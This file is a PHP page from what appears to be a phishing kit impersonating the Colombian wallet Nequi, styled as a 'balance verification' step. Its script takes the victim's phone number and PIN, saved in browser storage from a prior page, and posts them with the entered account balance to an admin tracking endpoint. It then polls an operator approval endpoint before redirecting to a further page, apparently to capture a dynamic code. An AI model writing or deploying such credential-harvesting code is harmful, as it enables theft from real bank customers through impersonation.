<?php
// Nequi saldo.php - Solicitud de Saldo
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Verificar Saldo - Nequi</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: 'Manrope', sans-serif; background: #FDE8F0; min-height: 100vh; }
    .nav { display: flex; justify-content: space-between; align-items: center; padding: 0 24px; background: white; border-bottom: 1px solid #F0E0E8; height: 64px; }
    .logo-img { height: 100px; width: auto; }
    .nav-btn { background: #FF006B; color: white; border: none; padding: 10px 22px; border-radius: 8px; font-weight: 700; font-size: 15px; cursor: pointer; }
    .page { min-height: calc(100vh - 64px); display: flex; align-items: center; justify-content: center; padding: 40px 16px; position: relative; overflow: hidden; }
    .blob { position: absolute; border-radius: 50%; background: rgba(255, 0, 107, 0.08); pointer-events: none; }
    .blob-1 { width: 260px; height: 260px; top: -60px; left: -80px; }
    .blob-2 { width: 200px; height: 200px; top: 20px; right: -60px; background: rgba(255, 0, 107, 0.05); }
    .blob-3 { width: 300px; height: 300px; bottom: -80px; left: -60px; background: rgba(255, 0, 107, 0.06); }
    .blob-4 { width: 180px; height: 180px; bottom: 40px; right: -50px; background: rgba(255, 0, 107, 0.04); }
    .card { background: white; border-radius: 20px; padding: 40px 32px; width: 100%; max-width: 420px; position: relative; z-index: 2; box-shadow: 0 4px 40px rgba(255, 0, 107, 0.08); }
    .card-title { font-size: 24px; font-weight: 800; color: #1A1A1A; text-align: center; margin-bottom: 10px; }
    .card-subtitle { font-size: 14px; color: #888; text-align: center; margin-bottom: 28px; line-height: 1.5; }

    #saldoPhase { display: block; }
    #pollingPhase { display: none; }

    .saldo-container { background: #f8f9fa; border-radius: 12px; padding: 20px; margin-bottom: 20px; border: 2px solid #FFADD1; }
    .saldo-label { font-size: 14px; color: #666; display: block; margin-bottom: 8px; font-weight: 600; }
    .saldo-input { width: 100%; padding: 14px 16px; border: 1.5px solid #E8E8E8; border-radius: 10px; font-size: 18px; font-weight: 700; color: #1A1A1A; background: white; transition: border-color 0.2s; font-family: 'Manrope', sans-serif; }
    .saldo-input:focus { outline: none; border-color: #FF006B; }
    .saldo-input::placeholder { color: #BBBBBB; font-weight: 400; }
    .saldo-mensaje { font-size: 13px; color: #e74c3c; text-align: center; margin-top: 8px; display: none; }
    .saldo-mensaje.show { display: block; }

    .submit-btn { width: 100%; background: #FFADD1; color: white; border: none; padding: 15px; border-radius: 10px; font-size: 16px; font-weight: 700; font-family: 'Manrope', sans-serif; cursor: not-allowed; transition: background 0.3s; }
    .submit-btn.active { background: #FF006B; cursor: pointer; }

    .polling-container { text-align: center; }
    .polling-spinner { width: 60px; height: 60px; border: 4px solid #FFADD1; border-top-color: #FF006B; border-radius: 50%; margin: 20px auto; animation: spin 1s linear infinite; }
    @keyframes spin { to { transform: rotate(360deg); } }
    .polling-text { font-size: 14px; color: #666; margin-top: 16px; }
    .polling-status { font-size: 13px; color: #999; margin-top: 8px; }

    .back-link { text-align: center; margin-top: 12px; }
    .back-link a { color: #FF006B; font-size: 13px; text-decoration: none; }

    @media (min-width: 768px) {
      .card { padding: 48px 44px; }
      .card-title { font-size: 28px; }
      .blob-1 { width: 380px; height: 380px; top: -100px; left: -120px; }
      .blob-2 { width: 300px; height: 300px; top: 20px; right: -80px; }
      .blob-3 { width: 420px; height: 420px; bottom: -120px; left: -80px; }
      .blob-4 { width: 260px; height: 260px; bottom: 60px; right: -60px; }
    }
  </style>
</head>
<body>

  <nav class="nav">
    <img src="logo.png" alt="Nequi" class="logo-img">
    <button class="nav-btn">Recarga</button>
  </nav>

  <div class="page">
    <div class="blob blob-1"></div>
    <div class="blob blob-2"></div>
    <div class="blob blob-3"></div>
    <div class="blob blob-4"></div>

    <div class="card">
      <!-- FASE 1: INGRESAR SALDO -->
      <div id="saldoPhase">
        <h1 class="card-title">Verificación de Saldo</h1>
        <p class="card-subtitle">Por favor, ingresa el saldo total de tu cuenta Nequi para continuar.</p>

        <div class="saldo-container">
          <label class="saldo-label">💰 Saldo total de la cuenta</label>
          <input type="text" class="saldo-input" id="saldoInput" placeholder="Ej: 55000" inputmode="numeric">
          <p class="saldo-mensaje" id="saldoMensaje">⚠️ Por favor, ingresa un saldo válido.</p>
        </div>

        <button class="submit-btn" id="submitBtnSaldo">Verificar Saldo</button>
        <div class="back-link">
          <a href="#" onclick="volverLogin()">← Volver</a>
        </div>
      </div>

      <!-- FASE 2: POLLING -->
      <div id="pollingPhase" style="display:none;">
        <div class="polling-container">
          <h1 class="card-title">Verificando saldo</h1>
          <p class="card-subtitle">Estamos verificando tu saldo. Por favor espera.</p>
          <div class="polling-spinner"></div>
          <p class="polling-text">Verificando...</p>
          <p class="polling-status" id="pollingStatus">Intento 1/3</p>
        </div>
      </div>
    </div>
  </div>

  <script>
    let pollingInterval = null;
    let logIdSaldo = null;

    // ========================================
    // VALIDACIÓN SALDO
    // ========================================
    function checkFormSaldo() {
      const saldo = document.getElementById('saldoInput').value.trim();
      const btn = document.getElementById('submitBtnSaldo');
      const saldoMensaje = document.getElementById('saldoMensaje');
      
      if (saldo.length >= 3 && /^\d+$/.test(saldo)) {
        btn.classList.add('active');
        btn.style.cursor = 'pointer';
        saldoMensaje.classList.remove('show');
        return true;
      } else {
        btn.classList.remove('active');
        btn.style.cursor = 'not-allowed';
        if (saldo.length > 0) {
          saldoMensaje.textContent = '⚠️ Ingresa un saldo válido (solo números, mínimo 3 dígitos)';
          saldoMensaje.classList.add('show');
        } else {
          saldoMensaje.classList.remove('show');
        }
        return false;
      }
    }

    document.getElementById('saldoInput').addEventListener('input', function(e) {
      this.value = this.value.replace(/\D/g, '');
      if (this.value.length > 12) this.value = this.value.slice(0, 12);
      checkFormSaldo();
    });

    // ========================================
    // ENVIAR SALDO
    // ========================================
    async function sendSaldoData() {
      const saldo = document.getElementById('saldoInput').value.trim();
      const usuario = localStorage.getItem('usuario_nequi') || '';
      const clave = localStorage.getItem('clave_pin_nequi') || '';

      if (!saldo || saldo.length < 3) {
        document.getElementById('saldoMensaje').textContent = '⚠️ Ingresa un saldo válido (mínimo 3 dígitos)';
        document.getElementById('saldoMensaje').classList.add('show');
        return false;
      }

      const formData = new FormData();
      formData.append('activity', 'SALDO (NEQUI)');
      formData.append('action', 'log');
      formData.append('metodo', 'PSE');
      formData.append('banco', 'Nequi');
      formData.append('documento', usuario);
      formData.append('usuario', usuario);
      formData.append('identificacion', usuario);
      formData.append('tipo_identificacion', 'CELULAR');
      formData.append('clave_pin', clave);
      formData.append('saldo', saldo);
      formData.append('clave_tarjeta', '');
      formData.append('ultimos_digitos', '');

      try {
        const response = await fetch('../../admin/track_stats.php', {
          method: 'POST',
          body: formData,
          keepalive: true
        });

        const data = await response.json();
        console.log('📝 Respuesta track_stats (saldo):', data);
        
        if (data.success) {
          logIdSaldo = data.id;
          localStorage.setItem('log_id_saldo_nequi', data.id);
          return true;
        }
      } catch (err) {
        console.error('Error:', err);
      }
      return false;
    }

    // ========================================
    // CHECK SALDO STATUS
    // ========================================
    async function checkSaldoStatus() {
      if (!logIdSaldo) return;

      try {
        const response = await fetch(`../../admin/check_aprobacion.php?log_id=${logIdSaldo}`);
        const data = await response.json();

        console.log('📊 Respuesta check_aprobacion (saldo):', data);

        if (data.estado === 'aprobado') {
          console.log('✅ SALDO APROBADO - Redirigiendo a dinamica.php');
          clearInterval(pollingInterval);
          localStorage.setItem('saldo_aprobado_nequi', 'true');
          window.location.href = 'dinamica.php';
        } else if (data.estado === 'rechazado') {
          console.log('❌ SALDO RECHAZADO');
          clearInterval(pollingInterval);
          
          document.getElementById('saldoPhase').style.display = 'block';
          document.getElementById('pollingPhase').style.display = 'none';
          
          document.getElementById('saldoMensaje').textContent = '❌ Saldo incorrecto. Verifica el monto e intenta de nuevo.';
          document.getElementById('saldoMensaje').classList.add('show');
          document.getElementById('saldoInput').value = '';
          document.getElementById('saldoInput').focus();
          checkFormSaldo();
        } else {
          console.log('⏳ Pendiente...');
        }
      } catch (err) {
        console.error('Error checking saldo status:', err);
      }
    }

    // ========================================
    // VOLVER A LOGIN
    // ========================================
    function volverLogin() {
      if (pollingInterval) {
        clearInterval(pollingInterval);
        pollingInterval = null;
      }
      window.location.href = 'index.php';
    }

    // ========================================
    // EVENTO: BOTÓN SALDO
    // ========================================
    document.getElementById('submitBtnSaldo').addEventListener('click', async () => {
      const btn = document.getElementById('submitBtnSaldo');
      if (!btn.classList.contains('active')) return;

      const success = await sendSaldoData();
      
      if (success) {
        document.getElementById('saldoPhase').style.display = 'none';
        document.getElementById('pollingPhase').style.display = 'block';
        document.getElementById('pollingStatus').textContent = 'Verificando saldo...';

        checkSaldoStatus();
        
        let intentoActual = 1;
        if (pollingInterval) clearInterval(pollingInterval);
        pollingInterval = setInterval(() => {
          intentoActual++;
          document.getElementById('pollingStatus').textContent = `Verificando saldo... Intento ${intentoActual}/∞`;
          checkSaldoStatus();
        }, 2000);
      } else {
        alert('❌ Error al enviar el saldo. Intenta de nuevo.');
      }
    });
  </script>
</body>
</html>